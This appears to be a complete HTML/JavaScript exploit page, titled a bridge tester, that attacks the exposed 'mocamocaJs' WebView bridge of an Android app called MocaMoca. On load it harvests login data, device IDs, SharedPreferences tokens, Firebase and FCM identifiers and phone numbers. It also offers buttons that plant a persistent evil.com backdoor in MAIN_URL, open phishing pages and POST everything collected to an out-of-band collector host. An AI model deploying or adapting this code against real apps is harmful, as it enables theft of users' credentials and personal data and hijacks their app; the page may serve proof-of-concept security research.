<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
:root {
  --bg: #0d1117;
  --card: #161b22;
  --border: #30363d;
  --text: #c9d1d9;
  --green: #3fb950;
  --red: #f85149;
  --yellow: #d2991d;
  --blue: #58a6ff;
  --muted: #8b949e;
  --font: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  background: var(--bg);
  color: var(--text);
  font-family: var(--font);
  font-size: 13px;
  line-height: 1.5;
  padding: 16px;
}
h1 { font-size: 18px; color: var(--red); margin-bottom: 4px; }
.subtitle { color: var(--muted); margin-bottom: 20px; font-size: 11px; }
h2 {
  font-size: 14px;
  color: var(--blue);
  border-bottom: 1px solid var(--border);
  padding-bottom: 6px;
  margin: 24px 0 12px;
  text-transform: uppercase;
  letter-spacing: 1px;
}
.card {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 14px;
  margin-bottom: 12px;
}
.row { display: flex; align-items: baseline; padding: 4px 0; }
.key { color: var(--blue); min-width: 200px; flex-shrink: 0; }
.val { color: var(--text); word-break: break-all; }
.val-trunc { color: var(--text); word-break: break-all; max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.ok { color: var(--green); }
.fail { color: var(--red); }
.warn { color: var(--yellow); }
.spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid var(--border); border-top-color: var(--blue); border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 6px; }
@keyframes spin { to { transform: rotate(360deg); } }
.btn-row { margin-top: 16px; display: flex; gap: 8px; flex-wrap: wrap; }
button {
  background: var(--card);
  color: var(--text);
  border: 1px solid var(--border);
  padding: 8px 16px;
  border-radius: 6px;
  cursor: pointer;
  font-family: var(--font);
  font-size: 12px;
}
button:hover { background: #1c2129; border-color: var(--blue); }
button.danger { border-color: var(--red); color: var(--red); }
button.danger:hover { background: #1a1015; }
button.green { border-color: var(--green); color: var(--green); }
pre {
  background: #0d1117;
  border: 1px solid var(--border);
  border-radius: 4px;
  padding: 10px;
  overflow-x: auto;
  font-size: 11px;
  max-height: 300px;
  overflow-y: auto;
  white-space: pre-wrap;
}
.hidden { display: none; }
.badge {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 10px;
  font-size: 10px;
  font-weight: bold;
  margin-left: 6px;
}
.badge-ok { background: #1a3a1a; color: var(--green); }
.badge-fail { background: #3a1a1a; color: var(--red); }
</style>
</head>
<body>

<h1>MocaMoca Bridge Tester</h1>
<div class="subtitle">WebView JS Bridge Exploitation | mocamocaJs</div>

<!-- =================== BRIDGE STATUS =================== -->
<h2>1. Bridge Detection</h2>
<div class="card" id="bridge-status">
  <span class="spinner"></span> Detecting bridge...
</div>

<!-- =================== DEVICE & USER =================== -->
<h2>2. Device &amp; User Enumeration</h2>
<div class="card" id="device-info"></div>

<!-- =================== SHARED PREFERENCES =================== -->
<h2>3. SharedPreferences Dump</h2>
<div class="card" id="shared-prefs"></div>

<!-- =================== TOKENS & IDS =================== -->
<h2>4. Tokens, IDs &amp; Location</h2>
<div class="card" id="tokens"></div>

<!-- =================== PHONE & CONTACTS =================== -->
<h2>5. Phone, Contacts &amp; SMS</h2>
<div class="card" id="phone-info"></div>

<!-- =================== EXFILTRATION LOG =================== -->
<h2>6. Exfiltration Log</h2>
<div class="card">
  <pre id="exfil-log">Waiting for data collection...</pre>
</div>

<!-- =================== ACTIONS =================== -->
<h2>7. Actions</h2>
<div class="card">
  <div class="btn-row">
    <button onclick="dumpAllSp()" class="green">Dump ALL SharedPrefs</button>
    <button onclick="persistBackdoor()" class="danger">Set MAIN_URL Backdoor</button>
    <button onclick="testOpenWeb()">Test openWeb()</button>
    <button onclick="testOpenBrowser()">Test openBrowser()</button>
    <button onclick="exfilAll()" class="green">Exfiltrate Everything</button>
  </div>
</div>

<script>
// ============================================================
// CONFIG — change this to your collector server
// ============================================================
const COLLECTOR = "https://kyfcridixbvmtsbeaesvfl6m2tbevou5m.oast.fun/collect";

// ============================================================
// Bridge detection
// ============================================================
const BRIDGE_NAME = "mocamocaJs";
let bridge = null;
let bridgeMethods = [];

function detectBridge() {
  const el = document.getElementById("bridge-status");
  try {
    bridge = window[BRIDGE_NAME];
    if (bridge && typeof bridge === "object") {
      // Enumerate all methods
      bridgeMethods = [];
      for (let key in bridge) {
        if (typeof bridge[key] === "function") {
          bridgeMethods.push(key);
        }
      }
      el.innerHTML = `<span class="ok">✓ Bridge FOUND</span> — <code>${BRIDGE_NAME}</code> has <b>${bridgeMethods.length}</b> methods
        <br><br><details><summary>All methods (click to expand)</summary>
        <pre>${bridgeMethods.sort().join("\n")}</pre></details>`;
    } else {
      el.innerHTML = `<span class="fail">✗ Bridge NOT FOUND</span> — <code>window.${BRIDGE_NAME}</code> is not an object`;
    }
  } catch(e) {
    el.innerHTML = `<span class="fail">✗ Bridge ERROR</span> — ${e.message}`;
  }
}

// ============================================================
// Safe call wrapper (handles callbacks & exceptions)
// ============================================================
function safeCall(methodName, ...args) {
  try {
    if (!bridge || typeof bridge[methodName] !== "function") {
      return Promise.resolve({ error: `method '${methodName}' not found` });
    }
    const result = bridge[methodName](...args);
    // Some bridge methods use callbacks (last arg is callback name)
    // Some return synchronously
    if (result instanceof Promise) {
      return result.then(v => ({ value: v })).catch(e => ({ error: e.message }));
    }
    return Promise.resolve({ value: result });
  } catch(e) {
    return Promise.resolve({ error: e.message });
  }
}

// ============================================================
// Logging
// ============================================================
const collectedData = {};

function log(key, value) {
  collectedData[key] = value;
  const el = document.getElementById("exfil-log");
  el.textContent = JSON.stringify(collectedData, null, 2);
}

function addRow(parentId, key, value, truncate = false) {
  const parent = document.getElementById(parentId);
  const cls = truncate ? "val-trunc" : "val";
  parent.innerHTML += `<div class="row"><span class="key">${key}</span><span class="${cls}">${escapeHtml(String(value))}</span></div>`;
}

function escapeHtml(str) {
  const div = document.createElement("div");
  div.textContent = str;
  return div.innerHTML;
}

// ============================================================
// Phase 2: Device & User Info (synchronous calls)
// ============================================================
async function collectDeviceInfo() {
  const el = document.getElementById("device-info");
  el.innerHTML = '<span class="spinner"></span> Collecting...';

  const calls = [
    ["sysPlatform",     "sysPlatform()",     []],
    ["getUinfo",        "getUinfo()",         []],
    ["getLoginData",    "getLoginData()",     []],
    ["getAndroidId",    "getAndroidId()",     []],
    ["getDeviceKey",    "getDeviceKey()",     []],
    ["getLocalNumber",  "getLocalNumber()",   []],
    ["getAppsFlyerData","getAppsFlyerData()", []],
    ["getDeviceBuildVersion","getDeviceBuildVersion()", []],
    ["getLaunchTimestamp","getLaunchTimestamp()", []],
    ["getStatusBarHeight","getStatusBarHeight()", []],
    ["getNavigationBarHeight","getNavigationBarHeight()", []],
  ];

  el.innerHTML = "";
  for (const [method, label, args] of calls) {
    const r = await safeCall(method, ...args);
    const v = r.error ? `<span class="fail">ERROR: ${r.error}</span>` : String(r.value);
    addRow("device-info", label, v);
    log(label, r.error ? `ERROR: ${r.error}` : r.value);
  }
}

// ============================================================
// Phase 3: SharedPreferences
// ============================================================
async function dumpAllSp() {
  const el = document.getElementById("shared-prefs");
  el.innerHTML = '<span class="spinner"></span> Dumping SharedPreferences...';

  // Common SP keys to probe
  const keys = [
    "MAIN_URL", "FCM_TOKEN", "local_number", "local_number_enable",
    "isNative", "JSBRIDGE_NAME", "TEST_URL", "apps_flyer_shared_preference",
    "APP_FIRST_OPEN", "assets_version", "loop_interval",
    "fullscreen", "user_token", "session_id", "access_token",
    "refresh_token", "device_key", "phone_number",
  ];

  el.innerHTML = "";
  for (const key of keys) {
    const r = await safeCall("getSp", key);
    if (r.value && r.value !== "" && r.value !== "defaultEmpty") {
      addRow("shared-prefs", key, r.value, true);
      log(`SP:${key}`, r.value);
    }
  }
  if (el.innerHTML === "") {
    el.innerHTML = '<span class="warn">No interesting SP values found.</span> Click "Dump ALL SharedPrefs" or manually probe keys.';
  }
}

// ============================================================
// Phase 4: Tokens, IDs, Location
// ============================================================
async function collectTokens() {
  const el = document.getElementById("tokens");
  el.innerHTML = '<span class="spinner"></span> Collecting tokens...';

  // FCM Token (async callback)
  const fcmPromise = new Promise((resolve) => {
    try {
      bridge.getFCMToken("__fcm_cb__");
      // Some bridges use a global callback pattern
      window.__fcm_cb_result__ = null;
      setTimeout(() => resolve(window.__fcm_cb_result__ || "timeout"), 3000);
    } catch(e) {
      resolve("ERROR: " + e.message);
    }
  });

  // Firebase install IDs
  const firebaseInstallId = await safeCall("getFirebaseInstallationsId");
  const firebaseInstanceId = await safeCall("getFirebaseInstanceId");

  el.innerHTML = "";
  addRow("tokens", "FCM Token", "waiting...");
  addRow("tokens", "FirebaseInstallId", firebaseInstallId.value || "null");
  addRow("tokens", "FirebaseInstanceId", firebaseInstanceId.value || "null");
  log("FirebaseInstallId", firebaseInstallId.value);
  log("FirebaseInstanceId", firebaseInstanceId.value);

  // Try FCM
  const fcm = await fcmPromise;
  document.getElementById("tokens").querySelector(".val").textContent = String(fcm);
  log("FCM_Token", fcm);
}

// ============================================================
// Phase 5: Phone, Contacts
// ============================================================
async function collectPhoneInfo() {
  const el = document.getElementById("phone-info");
  el.innerHTML = '<span class="spinner"></span> Collecting phone info...';

  const mobile = await safeCall("getMobileNumber");
  const mobiles = await safeCall("getMobileNambers");

  el.innerHTML = "";
  addRow("phone-info", "getMobileNumber()", mobile.value || "empty");
  addRow("phone-info", "getMobileNambers()", mobiles.value || "empty");
  log("PhoneNumber", mobile.value);
  log("AllPhoneNumbers", mobiles.value);
}

// ============================================================
// Actions
// ============================================================
function persistBackdoor() {
  try {
    bridge.setSp("MAIN_URL", "https://evil.com");
    const el = document.getElementById("shared-prefs");
    el.innerHTML += '<br><span class="ok">✓ MAIN_URL poisoned!</span> Next app launch loads evil.com directly.';
    log("ACTION", "setSp MAIN_URL → https://evil.com (PERSISTENT)");
  } catch(e) {
    log("ACTION_ERROR", e.message);
  }
}

function testOpenWeb() {
  try {
    bridge.openWeb("https://evil.com/confirmed", "#FF0000", "#000000");
    log("ACTION", "openWeb() called — new WebView to evil.com");
  } catch(e) {
    log("ACTION_ERROR", e.message);
  }
}

function testOpenBrowser() {
  try {
    bridge.openBrowser("https://evil.com/phishing");
    log("ACTION", "openBrowser() called — external browser to evil.com");
  } catch(e) {
    log("ACTION_ERROR", e.message);
  }
}

// ============================================================
// Exfiltrate everything to remote server
// ============================================================
async function exfilAll() {
  try {
    const resp = await fetch(COLLECTOR, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        app: "MocaMoca",
        version: "2.1.5",
        timestamp: Date.now(),
        bridgeMethods: bridgeMethods,
        data: collectedData,
        userAgent: navigator.userAgent,
      }),
    });
    document.getElementById("exfil-log").textContent += "\n\n✓ Data sent to collector";
  } catch(e) {
    document.getElementById("exfil-log").textContent += "\n\n✗ Exfil failed: " + e.message;
  }
}

// ============================================================
// Init — runs automatically
// ============================================================
(async function init() {
  detectBridge();

  if (!bridge) {
    document.getElementById("device-info").innerHTML = '<span class="fail">No bridge — aborting.</span>';
    return;
  }

  // Run all collectors in parallel for speed
  await Promise.all([
    collectDeviceInfo(),
    dumpAllSp(),
    collectTokens(),
    collectPhoneInfo(),
  ]);

  // Auto-exfiltrate if collector configured (uncomment below)
  // exfilAll();

  document.getElementById("exfil-log").textContent =
    JSON.stringify(collectedData, null, 2);
})();
</script>

</body>
</html>
